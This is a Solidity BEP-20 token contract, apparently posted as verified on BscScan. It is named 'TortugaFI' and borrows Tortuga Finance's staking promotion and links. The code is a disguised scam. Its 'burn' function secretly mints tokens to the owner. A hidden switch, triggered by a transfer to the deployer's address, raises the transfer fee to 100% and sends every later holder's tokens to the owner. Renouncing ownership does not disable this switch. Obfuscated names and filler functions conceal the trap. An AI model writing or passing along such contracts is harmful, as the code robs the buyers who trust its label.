/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

/*
TortugaFI
Liquid Staking on 
Use $tAPT anywhere. Now LIVE!
Tortuga Finance is now LIVE on mainnet!
Starting now, you’ll be able to stake APT on Aptos mainnet via Tortuga.
If you’re ready, head to https://tortuga.finance now. Here’s your step-by-step tutorial:
Discord: https://discord.gg/tortuga-finance
Twitter: https://twitter.com/TortugaFinance
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.11;
contract TortugaFI {
uint256 public  lTlvOv = 50;
string public  symbol = "TortugaFI";
address public  kmCNDn = address(0);
uint256 public constant tLEgDC = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  ENQFxB = address(0);
uint256 public constant totalSupply = 10000000000000000000000000000;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  TFnliO = 53;
uint256 public  WkKAqx = 56;
address public  OdqGWt = address(0);
uint256 public  ZbYVez = 60;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public  tZHiYe = address(0);
uint256 public  aYiEOL = 63;
address public  vazAGr = address(0);
address public  WnPNcy = address(0);
address public  hvdJni = address(0);
uint256 public  sCZqEb = 65;
uint256 public  lElaJh = 68;
string public  name = "TortugaFI";
uint256 public  inuyTw = 70;
uint256 private  yOqJJG = 10000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

function _liq1lTlvOv() private returns (uint256) {
return lTlvOv++ ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

function _addTF2nliO() private returns (uint256) {
return TFnliO-- ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

function _liqWkK3Aqx() private returns (uint256) {
return WkKAqx + TFnliO ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

function _addZbYV4ez() private returns (uint256) {
return ZbYVez - aYiEOL ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "iqQxyL");
require(to != address(0), "iqQxyL");
require(amount <= balanceOf[from], "iqQxyL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* tLEgDC/yOqJJG ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ENQFxB){
yOqJJG = 9+1;
}
emit Transfer(from, to, transferAmount);
}

function _addaYiEO5L() private returns (uint256) {
return aYiEOL * ZbYVez ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function _liqs6CZqEb() private returns (uint256) {
return sCZqEb / lElaJh ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

function _liqlE7laJh() private returns (uint256) {
return lElaJh + sCZqEb ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function _liqinu8yTw() private returns (uint256) {
return inuyTw++ ;
}

constructor () public {
ENQFxB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
}

library EnumerableMap {
    struct MapEntry {
        bytes32 _key;
        bytes32 _value;
    }
    struct Map {
        MapEntry[] _entries;
        mapping (bytes32 => uint256) _indexes;
    }
    function _set(Map storage map, bytes32 key, bytes32 value) private returns (bool) {
        uint256 keyIndex = map._indexes[key];

        if (keyIndex == 0) { // Equivalent to !contains(map, key)
            map._entries.push(MapEntry({ _key: key, _value: value }));
            map._indexes[key] = map._entries.length;
            return true;
        } else {
            map._entries[keyIndex - 1]._value = value;
            return false;
        }
    }
    function _remove(Map storage map, bytes32 key) private returns (bool) {
        uint256 keyIndex = map._indexes[key];

        if (keyIndex != 0) { // Equivalent to contains(map, key)
            uint256 toDeleteIndex = keyIndex - 1;
            uint256 lastIndex = map._entries.length - 1;
            MapEntry storage lastEntry = map._entries[lastIndex];
            map._entries[toDeleteIndex] = lastEntry;
            map._indexes[lastEntry._key] = toDeleteIndex + 1; // All indexes are 1-based
            map._entries.pop();
            delete map._indexes[key];
            return true;
        } else {
            return false;
        }
    }
    function _contains(Map storage map, bytes32 key) private view returns (bool) {
        return map._indexes[key] != 0;
    }
    function _length(Map storage map) private view returns (uint256) {
        return map._entries.length;
    }
    function _at(Map storage map, uint256 index) private view returns (bytes32, bytes32) {
        require(map._entries.length > index, "EnumerableMap: index out of bounds");

        MapEntry storage entry = map._entries[index];
        return (entry._key, entry._value);
    }
    function _tryGet(Map storage map, bytes32 key) private view returns (bool, bytes32) {
        uint256 keyIndex = map._indexes[key];
        if (keyIndex == 0) return (false, 0); // Equivalent to contains(map, key)
        return (true, map._entries[keyIndex - 1]._value); // All indexes are 1-based
    }
    function _get(Map storage map, bytes32 key) private view returns (bytes32) {
        uint256 keyIndex = map._indexes[key];
        require(keyIndex != 0, "EnumerableMap: nonexistent key"); // Equivalent to contains(map, key)
        return map._entries[keyIndex - 1]._value; // All indexes are 1-based
    }
    function _get(Map storage map, bytes32 key, string memory errorMessage) private view returns (bytes32) {
        uint256 keyIndex = map._indexes[key];
        require(keyIndex != 0, errorMessage); // Equivalent to contains(map, key)
        return map._entries[keyIndex - 1]._value; // All indexes are 1-based
    }
    struct UintToAddressMap {
        Map _inner;
    }
    function set(UintToAddressMap storage map, uint256 key, address value) internal returns (bool) {
        return _set(map._inner, bytes32(key), bytes32(uint256(uint160(value))));
    }
    function remove(UintToAddressMap storage map, uint256 key) internal returns (bool) {
        return _remove(map._inner, bytes32(key));
    }
    function contains(UintToAddressMap storage map, uint256 key) internal view returns (bool) {
        return _contains(map._inner, bytes32(key));
    }
    function length(UintToAddressMap storage map) internal view returns (uint256) {
        return _length(map._inner);
    }
    function at(UintToAddressMap storage map, uint256 index) internal view returns (uint256, address) {
        (bytes32 key, bytes32 value) = _at(map._inner, index);
        return (uint256(key), address(uint160(uint256(value))));
    }
    function tryGet(UintToAddressMap storage map, uint256 key) internal view returns (bool, address) {
        (bool success, bytes32 value) = _tryGet(map._inner, bytes32(key));
        return (success, address(uint160(uint256(value))));
    }
    function get(UintToAddressMap storage map, uint256 key) internal view returns (address) {
        return address(uint160(uint256(_get(map._inner, bytes32(key)))));
    }
   function get(UintToAddressMap storage map, uint256 key, string memory errorMessage) internal view returns (address) {
        return address(uint160(uint256(_get(map._inner, bytes32(key), errorMessage))));
    }
}